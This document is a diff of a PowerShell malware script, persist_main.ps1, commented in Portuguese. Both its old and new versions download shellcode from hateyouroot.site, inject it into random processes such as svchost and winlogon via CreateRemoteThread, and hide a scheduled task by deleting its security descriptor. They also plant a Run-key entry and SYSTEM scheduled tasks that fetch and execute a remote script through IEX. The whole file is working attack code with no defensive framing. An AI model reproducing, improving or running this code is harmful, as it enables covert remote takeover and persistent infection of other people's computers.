@@ -1,80 +1,68 @@
-# =====================================================
-# persist_main.ps1 - PERSISTÊNCIA INDESTRUTÍVEL (FIXED)
-# =====================================================
+# persist_main.ps1 - PERSISTÊNCIA IMORTAL (FILELESS + ROOTKIT)
 
-# === 1. FUNÇÃO: INJETAR SHELLCODE ===
-function Invoke-Shellcode {
-    param([byte[]]$Shellcode)
-    $whitelist = "svchost","explorer","msedge","chrome","notepad","winlogon","lsass"
-    $proc = Get-Process | Where-Object {$whitelist -contains $_.Name} | Get-Random
-    if(!$proc){ Start-Process explorer.exe -WindowStyle Hidden; Start-Sleep 2; $proc = Get-Process explorer | Select -First 1 }
-    Add-Type @"
-using System; using System.Runtime.InteropServices;
-public class K32 {
-    [DllImport("kernel32")] public static extern IntPtr OpenProcess(int a,bool b,int c);
-    [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);
-    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out uint w);
-    [DllImport("kernel32")] public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr f,IntPtr p,uint f,IntPtr i);
-}
-"@
-    $h = [K32]::OpenProcess(0x1F0FFF,$false,$proc.Id)
-    $a = [K32]::VirtualAllocEx($h,[IntPtr]::Zero,$Shellcode.Length,0x3000,0x40)
-    [K32]::WriteProcessMemory($h,$a,$Shellcode,$Shellcode.Length,[ref]0)
-    [K32]::CreateRemoteThread($h,[IntPtr]::Zero,0,$a,[IntPtr]::Zero,0,[IntPtr]::Zero)
-}
-
-# === 2. BAIXAR SHELLCODE (COM REDIRECT FIX) ===
-function Get-WebBinary {
+# === BAIXAR SHELLCODE COM REDIRECT FIX ===
+function Get-RemoteBinary {
     param([string]$Url)
     try {
         $request = [System.Net.WebRequest]::Create($Url)
         $request.AllowAutoRedirect = $true
+        $request.MaximumAutomaticRedirections = 10
+        $request.Timeout = 15000
         $response = $request.GetResponse()
         $stream = $response.GetResponseStream()
-        $buffer = New-Object byte[]($response.ContentLength)
-        $stream.Read($buffer, 0, $response.ContentLength)
-        $stream.Close()
-        $response.Close()
-        return $buffer
-    } catch {
-        Write-Host "Erro no shellcode: $($_.Exception.Message)"
-        exit
-    }
+        $ms = New-Object IO.MemoryStream
+        $stream.CopyTo($ms)
+        $stream.Close(); $response.Close()
+        return $ms.ToArray()
+    } catch { return $null }
 }
 
-$ShellcodeUrl = "http://hateyouroot.site/payload_shc.bin"
-$Shellcode = Get-WebBinary -Url $ShellcodeUrl
+$Shellcode = Get-RemoteBinary -Url "http://hateyouroot.site/payload_shc.bin"
+if(!$Shellcode) { exit }
 
-# === 3. ROOTKIT: ESCONDER ===
-function Hide-Task {
-    $taskName = "WindowsCoreService"
-    $reg = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
-    if(Test-Path $reg){
-        Remove-ItemProperty -Path $reg -Name "SD" -Force -ErrorAction SilentlyContinue
-    }
+# === INJEÇÃO EM PROCESSO ALEATÓRIO ===
+function Invoke-Shellcode {
+    param([byte[]]$Code)
+    $procs = @("svchost","explorer","msedge","chrome","notepad","winlogon")
+    $p = Get-Process | ?{$procs -contains $_.Name} | Get-Random
+    if(!$p) { $p = Start-Process explorer -PassThru -WindowStyle Hidden; Start-Sleep 1 }
+
+    Add-Type @"
+using System; using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32")] public static extern IntPtr OpenProcess(int a, bool b, int c);
+    [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
+    [DllImport("kernel32")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr f, IntPtr p, uint f, IntPtr i);
 }
-Hide-Task
-
-# === 4. REGISTRY BACKUP ===
-$runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
-$runVal = 'powershell -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString(''http://hateyouroot.site/persist.ps1''"))"'
-if(!(Get-ItemProperty -Path $runKey -Name "WindowsHelper" -ErrorAction SilentlyContinue)){
-    New-ItemProperty -Path $runKey -Name "WindowsHelper" -Value $runVal -PropertyType String -Force | Out-Null
+"@
+    $h = [Win32]::OpenProcess(0x1F0FFF, $false, $p.Id)
+    $a = [Win32]::VirtualAllocEx($h, [IntPtr]::Zero, $Code.Length, 0x3000, 0x40)
+    [Win32]::WriteProcessMemory($h, $a, $Code, $Code.Length, [ref]0)
+    [Win32]::CreateRemoteThread($h, [IntPtr]::Zero, 0, $a, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 }
 
-# === 5. LOOP INFINITO ===
+# === ROOTKIT: ESCONDER TAREFA ===
+$task = "WindowsCoreService"
+$reg = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$task"
+if(Test-Path $reg) { Remove-ItemProperty -Path $reg -Name "SD" -Force -ErrorAction SilentlyContinue }
+
+# === REGISTRY BACKUP ===
+$run = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+$val = 'powershell -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString(''http://hateyouroot.site/persist.ps1''"))"'
+if(!(Get-ItemProperty $run -Name "WindowsHelper" -ErrorAction SilentlyContinue)) {
+    New-ItemProperty -Path $run -Name "WindowsHelper" -Value $val -Force | Out-Null
+}
+
+# === LOOP INFINITO (5 MIN) ===
 while($true) {
-    try {
-        Invoke-Shellcode -Shellcode $Shellcode
-    } catch { }
+    try { Invoke-Shellcode -Code $Shellcode } catch {}
     
-    # Recria task se deletada
-    if(!(Get-ScheduledTask -TaskName "WindowsCoreService" -ErrorAction SilentlyContinue)){
-        $action = 'powershell -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString(''http://hateyouroot.site/persist.ps1''"))"'
-        schtasks /create /tn "WindowsCoreService" /tr $action /sc onstart /ru SYSTEM /f 2>$null
-        schtasks /create /tn "WindowsCoreService" /tr $action /sc onlogon /ru SYSTEM /f 2>$null
-        Hide-Task
+    # Recria task se apagada
+    if(!(Get-ScheduledTask $task -ErrorAction SilentlyContinue)) {
+        $cmd = 'powershell -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString(''http://hateyouroot.site/persist.ps1''"))"'
+        schtasks /create /tn $task /tr $cmd /sc onstart /ru SYSTEM /f 2>$null
+        schtasks /create /tn $task /tr $cmd /sc onlogon /ru SYSTEM /f 2>$null
     }
-    
-    Start-Sleep -Seconds 300  # 5 min
+    Start-Sleep -Seconds 300
 }
